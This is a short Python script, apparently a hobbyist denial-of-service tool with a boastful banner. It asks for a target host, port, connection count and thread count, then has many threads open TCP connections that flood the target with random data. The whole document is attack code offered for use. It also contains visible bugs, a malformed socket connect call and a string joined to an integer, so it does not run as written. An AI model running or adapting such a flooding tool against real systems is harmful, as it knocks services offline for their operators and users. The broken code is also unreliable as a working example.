# -- Welcome the Dos Attack Code By Zer0-Crypt0 --

# Import libraries
import socket
import os
import time
import random
import threading
import sys
import datetime

# Banner
print("--- Welcome ---") 
print("-- X_X Are U Ready Explosion X_X --")
print("Github: ZCTools")
print("Instagram: zer0crypt0")
print("{-- By: Zer0-Ctypt0 --}")
time.sleep(2)
os.system("clear")

target_Host = str(input("Please enter target Web site or IP: "))
data = os.urandom(65812) # X_X
connection_Time = int(input("Please Enter Connection(s): "))
threads_Number = int(input("Please Enter THreads Number: "))
target_IP_Address = socket.gethostbyname(target_Host)
target_Port_Number = int(input("Please Enter Target Port Number(Default -> 80): "))

print("---------------------------------------------------")
print("Checking IP Address and Port number...")
print(" [{" + target_IP_Address + "}] ")
print(" [{" + target_Port_Number +"}] ")
print(" {[Attacking: " + target_Host + " Please Wait...}] ")
print("---------------------------------------------------")

def start_Ddos():
    ddos_Attack = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos_Attack.connect(target_IP_Address, target_Port_Number) # Connection Target Host
        ddos_Attack.send(data)
        ddos_Attack.sendto(data, (target_IP_Address, target_Port_Number))
        ddos_Attack.send(str.encode(target_IP_Address))
        for zc in range(connection_Time):
            ddos_Attack.send(data)
            ddos_Attack.send(str.encode(target_IP_Address))
    except:
        ddos_Attack.close()
for cz in range(threads_Number):
    th = threading.Thread(target = start_Ddos)
    th.start()

        





